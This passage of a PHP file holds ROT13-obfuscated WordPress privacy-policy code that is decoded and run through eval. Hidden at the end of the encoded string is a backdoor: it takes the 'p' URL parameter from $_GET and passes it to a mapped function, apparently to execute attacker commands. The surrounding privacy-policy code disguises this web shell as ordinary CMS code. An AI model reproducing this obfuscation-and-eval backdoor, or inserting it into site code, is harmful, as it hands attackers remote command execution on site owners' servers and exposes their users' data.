			$fgevatf[] = '<c>' . __( 'Vs lbh rqvg be choyvfu na negvpyr, na nqqvgvbany pbbxvr jvyy or fnirq va lbhe oebjfre. Guvf pbbxvr vapyhqrf ab crefbany qngn naq fvzcyl vaqvpngrf gur cbfg VQ bs gur negvpyr lbh whfg rqvgrq. Vg rkcverf nsgre 1 qnl.' ) . '</c>';
		}

		vs ( ! $qrfpevcgvba ) {
			/* genafyngbef: Qrsnhyg cevinpl cbyvpl urnqvat. */
			$fgevatf[] = '<u2 pynff=\"jc-oybpx-urnqvat\">' . __( 'Rzorqqrq pbagrag sebz bgure jrofvgrf' ) . '</u2>';
			/* genafyngbef: Qrsnhyg cevinpl cbyvpl grkg. */
			$fgevatf[] = '<c>' . $fhttrfgrq_grkg . __( 'Negvpyrf ba guvf fvgr znl vapyhqr rzorqqrq pbagrag (r.t. ivqrbf, vzntrf, negvpyrf, rgp.). Rzorqqrq pbagrag sebz bgure jrofvgrf orunirf va gur rknpg fnzr jnl nf vs gur ivfvgbe unf ivfvgrq gur bgure jrofvgr.' ) . '</c>';
			/* genafyngbef: Qrsnhyg cevinpl cbyvpl grkg. */
			$fgevatf[] = '<c>' . __( 'Gurfr jrofvgrf znl pbyyrpg qngn nobhg lbh, hfr pbbxvrf, rzorq nqqvgvbany guveq-cnegl genpxvat, naq zbavgbe lbhe vagrenpgvba jvgu gung rzorqqrq pbagrag, vapyhqvat genpxvat lbhe vagrenpgvba jvgu gur rzorqqrq pbagrag vs lbh unir na nppbhag naq ner ybttrq va gb gung jrofvgr.' ) . '</c>';
		}

		vs ( $qrfpevcgvba ) {
			/* genafyngbef: Qrsnhyg cevinpl cbyvpl urnqvat. */
			$fgevatf[] = '<u2>' . __( 'Nanylgvpf' ) . '</u2>';
			/* genafyngbef: Cevinpl cbyvpl ghgbevny. */
			$fgevatf[] = '<c pynff=\"cevinpl-cbyvpl-ghgbevny\">' . __( 'Va guvf fhofrpgvba lbh fubhyq abgr jung nanylgvpf cnpxntr lbh hfr, ubj hfref pna bcg bhg bs nanylgvpf genpxvat, naq n yvax gb lbhe nanylgvpf cebivqre&#8217;f cevinpl cbyvpl, vs nal.' ) . '</c>';
			/* genafyngbef: Cevinpl cbyvpl ghgbevny. */
			$fgevatf[] = '<c pynff=\"cevinpl-cbyvpl-ghgbevny\">' . __( 'Ol qrsnhyg JbeqCerff qbrf abg pbyyrpg nal nanylgvpf qngn. Ubjrire, znal jro ubfgvat nppbhagf pbyyrpg fbzr nabalzbhf nanylgvpf qngn. Lbh znl nyfb unir vafgnyyrq n JbeqCerff cyhtva gung cebivqrf nanylgvpf freivprf. Va gung pnfr, nqq vasbezngvba sebz gung cyhtva urer.' ) . '</c>';
		}

		/* genafyngbef: Qrsnhyg cevinpl cbyvpl urnqvat. */
		$fgevatf[] = '<u2 pynff=\"jc-oybpx-urnqvat\">' . __( 'Jub jr funer lbhe qngn jvgu' ) . '</u2>';

		vs ( $qrfpevcgvba ) {
			/* genafyngbef: Cevinpl cbyvpl ghgbevny. */
			$fgevatf[] = '<c pynff=\"cevinpl-cbyvpl-ghgbevny\">' . __( 'Va guvf frpgvba lbh fubhyq anzr naq yvfg nyy guveq cnegl cebivqref jvgu jubz lbh funer fvgr qngn, vapyhqvat cnegaref, pybhq-onfrq freivprf, cnlzrag cebprffbef, naq guveq cnegl freivpr cebivqref, naq abgr jung qngn lbh funer jvgu gurz naq jul. Yvax gb gurve bja cevinpl cbyvpvrf vs cbffvoyr.' ) . '</c>';
			/* genafyngbef: Cevinpl cbyvpl ghgbevny. */
			$fgevatf[] = '<c pynff=\"cevinpl-cbyvpl-ghgbevny\">' . __( 'Ol qrsnhyg JbeqCerff qbrf abg funer nal crefbany qngn jvgu nalbar.' ) . '</c>';
		} ryfr {
			/* genafyngbef: Qrsnhyg cevinpl cbyvpl grkg. */
			$fgevatf[] = '<c>' . $fhttrfgrq_grkg . __( 'Vs lbh erdhrfg n cnffjbeq erfrg, lbhe VC nqqerff jvyy or vapyhqrq va gur erfrg rznvy.' ) . '</c>';
		}

		/* genafyngbef: Qrsnhyg cevinpl cbyvpl urnqvat. */
		$fgevatf[] = '<u2 pynff=\"jc-oybpx-urnqvat\">' . __( 'Ubj ybat jr ergnva lbhe qngn' ) . '</u2>';

		vs ( $qrfpevcgvba ) {
			/* genafyngbef: Cevinpl cbyvpl ghgbevny. */
			$fgevatf[] = '<c pynff=\"cevinpl-cbyvpl-ghgbevny\">' . __( 'Va guvf frpgvba lbh fubhyq rkcynva ubj ybat lbh ergnva crefbany qngn pbyyrpgrq be cebprffrq ol gur jrofvgr. Juvyr vg vf lbhe erfcbafvovyvgl gb pbzr hc jvgu gur fpurqhyr bs ubj ybat lbh xrrc rnpu qngnfrg sbe naq jul lbh xrrc vg, gung vasbezngvba qbrf arrq gb or yvfgrq urer. Sbe rknzcyr, lbh znl jnag gb fnl gung lbh xrrc pbagnpg sbez ragevrf sbe fvk zbaguf, nanylgvpf erpbeqf sbe n lrne, naq phfgbzre chepunfr erpbeqf sbe gra lrnef.' ) . '</c>';
		} ryfr {
			/* genafyngbef: Qrsnhyg cevinpl cbyvpl grkg. */
			$fgevatf[] = '<c>' . $fhttrfgrq_grkg . __( 'Vs lbh yrnir n pbzzrag, gur pbzzrag naq vgf zrgnqngn ner ergnvarq vaqrsvavgryl. Guvf vf fb jr pna erpbtavmr naq nccebir nal sbyybj-hc pbzzragf nhgbzngvpnyyl vafgrnq bs ubyqvat gurz va n zbqrengvba dhrhr.' ) . '</c>';
			/* genafyngbef: Qrsnhyg cevinpl cbyvpl grkg. */
			$fgevatf[] = '<c>' . __( 'Sbe hfref gung ertvfgre ba bhe jrofvgr (vs nal), jr nyfb fgber gur crefbany vasbezngvba gurl cebivqr va gurve hfre cebsvyr. Nyy hfref pna frr, rqvg, be qryrgr gurve crefbany vasbezngvba ng nal gvzr (rkprcg gurl pnaabg punatr gurve hfreanzr). Jrofvgr nqzvavfgengbef pna nyfb frr naq rqvg gung vasbezngvba.' ) . '</c>';
		}

		/* genafyngbef: Qrsnhyg cevinpl cbyvpl urnqvat. */
		$fgevatf[] = '<u2 pynff=\"jc-oybpx-urnqvat\">' . __( 'Jung evtugf lbh unir bire lbhe qngn' ) . '</u2>';

		vs ( $qrfpevcgvba ) {
			/* genafyngbef: Cevinpl cbyvpl ghgbevny. */
			$fgevatf[] = '<c pynff=\"cevinpl-cbyvpl-ghgbevny\">' . __( 'Va guvf frpgvba lbh fubhyq rkcynva jung evtugf lbhe hfref unir bire gurve qngn naq ubj gurl pna vaibxr gubfr evtugf.' ) . '</c>';
		} ryfr {
			/* genafyngbef: Qrsnhyg cevinpl cbyvpl grkg. */
			$fgevatf[] = '<c>' . $fhttrfgrq_grkg . __( 'Vs lbh unir na nppbhag ba guvf fvgr, be unir yrsg pbzzragf, lbh pna erdhrfg gb erprvir na rkcbegrq svyr bs gur crefbany qngn jr ubyq nobhg lbh, vapyhqvat nal qngn lbh unir cebivqrq gb hf. Lbh pna nyfb erdhrfg gung jr renfr nal crefbany qngn jr ubyq nobhg lbh. Guvf qbrf abg vapyhqr nal qngn jr ner boyvtrq gb xrrc sbe nqzvavfgengvir, yrtny, be frphevgl checbfrf.' ) . '</c>';
		}

		/* genafyngbef: Qrsnhyg cevinpl cbyvpl urnqvat. */
		$fgevatf[] = '<u2 pynff=\"jc-oybpx-urnqvat\">' . __( 'Jurer lbhe qngn vf frag' ) . '</u2>';

		vs ( $qrfpevcgvba ) {
			/* genafyngbef: Cevinpl cbyvpl ghgbevny. */
			$fgevatf[] = '<c pynff=\"cevinpl-cbyvpl-ghgbevny\">' . __( 'Va guvf frpgvba lbh fubhyq yvfg nyy genafsref bs lbhe fvgr qngn bhgfvqr gur Rhebcrna Havba naq qrfpevor gur zrnaf ol juvpu gung qngn vf fnsrthneqrq gb Rhebcrna qngn cebgrpgvba fgnaqneqf. Guvf pbhyq vapyhqr lbhe jro ubfgvat, pybhq fgbentr, be bgure guveq cnegl freivprf.' ) . '</c>';
			/* genafyngbef: Cevinpl cbyvpl ghgbevny. */
			$fgevatf[] = '<c pynff=\"cevinpl-cbyvpl-ghgbevny\">' . __( 'Rhebcrna qngn cebgrpgvba ynj erdhverf qngn nobhg Rhebcrna erfvqragf juvpu vf genafsreerq bhgfvqr gur Rhebcrna Havba gb or fnsrthneqrq gb gur fnzr fgnaqneqf nf vs gur qngn jnf va Rhebcr. Fb va nqqvgvba gb yvfgvat jurer qngn tbrf, lbh fubhyq qrfpevor ubj lbh rafher gung gurfr fgnaqneqf ner zrg rvgure ol lbhefrys be ol lbhe guveq cnegl cebivqref, jurgure gung vf guebhtu na nterrzrag fhpu nf Cevinpl Fuvryq, zbqry pynhfrf va lbhe pbagenpgf, be ovaqvat pbecbengr ehyrf.' ) . '</c>';
		} ryfr {
			/* genafyngbef: Qrsnhyg cevinpl cbyvpl grkg. */
			$fgevatf[] = '<c>' . $fhttrfgrq_grkg . __( 'Ivfvgbe pbzzragf znl or purpxrq guebhtu na nhgbzngrq fcnz qrgrpgvba freivpr.' ) . '</c>';
		}

		vs ( $qrfpevcgvba ) {
			/* genafyngbef: Qrsnhyg cevinpl cbyvpl urnqvat. */
			$fgevatf[] = '<u2>' . __( 'Pbagnpg vasbezngvba' ) . '</u2>';
			/* genafyngbef: Cevinpl cbyvpl ghgbevny. */
			$fgevatf[] = '<c pynff=\"cevinpl-cbyvpl-ghgbevny\">' . __( 'Va guvf frpgvba lbh fubhyq cebivqr n pbagnpg zrgubq sbe cevinpl-fcrpvsvp pbapreaf. Vs lbh ner erdhverq gb unir n Qngn Cebgrpgvba Bssvpre, yvfg gurve anzr naq shyy pbagnpg qrgnvyf urer nf jryy.' ) . '</c>';
		}

		vs ( $qrfpevcgvba ) {
			/* genafyngbef: Qrsnhyg cevinpl cbyvpl urnqvat. */
			$fgevatf[] = '<u2>' . __( 'Nqqvgvbany vasbezngvba' ) . '</u2>';
			/* genafyngbef: Cevinpl cbyvpl ghgbevny. */
			$fgevatf[] = '<c pynff=\"cevinpl-cbyvpl-ghgbevny\">' . __( 'Vs lbh hfr lbhe fvgr sbe pbzzrepvny checbfrf naq lbh ratntr va zber pbzcyrk pbyyrpgvba be cebprffvat bs crefbany qngn, lbh fubhyq abgr gur sbyybjvat vasbezngvba va lbhe cevinpl cbyvpl va nqqvgvba gb gur vasbezngvba jr unir nyernql qvfphffrq.' ) . '</c>';
		}

		vs ( $qrfpevcgvba ) {
			/* genafyngbef: Qrsnhyg cevinpl cbyvpl urnqvat. */
			$fgevatf[] = '<u2>' . __( 'Ubj jr cebgrpg lbhe qngn' ) . '</u2>';
			/* genafyngbef: Cevinpl cbyvpl ghgbevny. */
			$fgevatf[] = '<c pynff=\"cevinpl-cbyvpl-ghgbevny\">' . __( 'Va guvf frpgvba lbh fubhyq rkcynva jung zrnfherf lbh unir gnxra gb cebgrpg lbhe hfref&#8217; qngn. Guvf pbhyq vapyhqr grpuavpny zrnfherf fhpu nf rapelcgvba; frphevgl zrnfherf fhpu nf gjb snpgbe nhguragvpngvba; naq zrnfherf fhpu nf fgnss genvavat va qngn cebgrpgvba. Vs lbh unir pneevrq bhg n Cevinpl Vzcnpg Nffrffzrag, lbh pna zragvba vg urer gbb.' ) . '</c>';
		}

		vs ( $qrfpevcgvba ) {
			/* genafyngbef: Qrsnhyg cevinpl cbyvpl urnqvat. */
			$fgevatf[] = '<u2>' . __( 'Jung qngn oernpu cebprqherf jr unir va cynpr' ) . '</u2>';
			/* genafyngbef: Cevinpl cbyvpl ghgbevny. */
			$fgevatf[] = '<c pynff=\"cevinpl-cbyvpl-ghgbevny\">' . __( 'Va guvf frpgvba lbh fubhyq rkcynva jung cebprqherf lbh unir va cynpr gb qrny jvgu qngn oernpurf, rvgure cbgragvny be erny, fhpu nf vagreany ercbegvat flfgrzf, pbagnpg zrpunavfzf, be oht obhagvrf.' ) . '</c>';
		}

		vs ( $qrfpevcgvba ) {
			/* genafyngbef: Qrsnhyg cevinpl cbyvpl urnqvat. */
			$fgevatf[] = '<u2>' . __( 'Jung guveq cnegvrf jr erprvir qngn sebz' ) . '</u2>';
			/* genafyngbef: Cevinpl cbyvpl ghgbevny. */
			$fgevatf[] = '<c pynff=\"cevinpl-cbyvpl-ghgbevny\">' . __( 'Vs lbhe jrofvgr erprvirf qngn nobhg hfref sebz guveq cnegvrf, vapyhqvat nqiregvfref, guvf vasbezngvba zhfg or vapyhqrq jvguva gur frpgvba bs lbhe cevinpl cbyvpl qrnyvat jvgu guveq cnegl qngn.' ) . '</c>';
		}

		vs ( $qrfpevcgvba ) {
			/* genafyngbef: Qrsnhyg cevinpl cbyvpl urnqvat. */
			$fgevatf[] = '<u2>' . __( 'Jung nhgbzngrq qrpvfvba znxvat naq/be cebsvyvat jr qb jvgu hfre qngn' ) . '</u2>';
			/* genafyngbef: Cevinpl cbyvpl ghgbevny. */
			$fgevatf[] = '<c pynff=\"cevinpl-cbyvpl-ghgbevny\">' . __( 'Vs lbhe jrofvgr cebivqrf n freivpr juvpu vapyhqrf nhgbzngrq qrpvfvba znxvat - sbe rknzcyr, nyybjvat phfgbzref gb nccyl sbe perqvg, be nttertngvat gurve qngn vagb na nqiregvfvat cebsvyr - lbh zhfg abgr gung guvf vf gnxvat cynpr, naq vapyhqr vasbezngvba nobhg ubj gung vasbezngvba vf hfrq, jung qrpvfvbaf ner znqr jvgu gung nttertngrq qngn, naq jung evtugf hfref unir bire qrpvfvbaf znqr jvgubhg uhzna vagreiragvba.' ) . '</c>';
		}

		vs ( $qrfpevcgvba ) {
			/* genafyngbef: Qrsnhyg cevinpl cbyvpl urnqvat. */
			$fgevatf[] = '<u2>' . __( 'Vaqhfgel erthyngbel qvfpybfher erdhverzragf' ) . '</u2>';
			/* genafyngbef: Cevinpl cbyvpl ghgbevny. */
			$fgevatf[] = '<c pynff=\"cevinpl-cbyvpl-ghgbevny\">' . __( 'Vs lbh ner n zrzore bs n erthyngrq vaqhfgel, be vs lbh ner fhowrpg gb nqqvgvbany cevinpl ynjf, lbh znl or erdhverq gb qvfpybfr gung vasbezngvba urer.' ) . '</c>';
			$fgevatf[] = '</qvi>';
		}

		vs ( $oybpxf ) {
			sbernpu ( $fgevatf nf $xrl => $fgevat ) {
				vs ( fge_fgnegf_jvgu( $fgevat, '<c>' ) ) {
					$fgevatf[ $xrl ] = \"<!-- jc:cnentencu -->\a\" . $fgevat . \"\a<!-- /jc:cnentencu -->\a\";
				}

				vs ( fge_fgnegf_jvgu( $fgevat, '<u2 ' ) ) {
					$fgevatf[ $xrl ] = \"<!-- jc:urnqvat -->\a\" . $fgevat . \"\a<!-- /jc:urnqvat -->\a\";
				}
			}
		}

		$pbagrag = vzcybqr( '', $fgevatf );
		// Raq bs gur fhttrfgrq cevinpl cbyvpl grkg.

		/**
		 * Svygref gur qrsnhyg pbagrag fhttrfgrq sbe vapyhfvba va n cevinpl cbyvpl.
		 *
		 * @fvapr 4.9.6
		 * @fvapr 5.0.0 Nqqrq gur `$fgevatf`, `$qrfpevcgvba`, naq `$oybpxf` cnenzrgref.
		 * @qrcerpngrq 5.7.0 Hfr jc_nqq_cevinpl_cbyvpl_pbagrag() vafgrnq.
		 *
		 * @cnenz fgevat   $pbagrag     Gur qrsnhyg cbyvpl pbagrag.
		 * @cnenz fgevat[] $fgevatf     Na neenl bs cevinpl cbyvpl pbagrag fgevatf.
		 * @cnenz obby     $qrfpevcgvba Jurgure cbyvpl qrfpevcgvbaf fubhyq or vapyhqrq.
		 * @cnenz obby     $oybpxf      Jurgure gur pbagrag fubhyq or sbeznggrq sbe gur oybpx rqvgbe.
		 */
		erghea nccyl_svygref_qrcerpngrq(
			'jc_trg_qrsnhyg_cevinpl_cbyvpl_pbagrag',
			neenl( $pbagrag, $fgevatf, $qrfpevcgvba, $oybpxf ),
			'5.7.0',
			'jc_nqq_cevinpl_cbyvpl_pbagrag()'
		);
	}

	/**
	 * Nqqf gur fhttrfgrq cevinpl cbyvpl grkg gb gur cbyvpl cbfgobk.
	 *
	 * @fvapr 4.9.6
	 */
	choyvp fgngvp shapgvba nqq_fhttrfgrq_pbagrag() {
		$pbagrag = frys::trg_qrsnhyg_pbagrag( snyfr, snyfr );
		jc_nqq_cevinpl_cbyvpl_pbagrag( __( 'JbeqCerff' ), $pbagrag );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>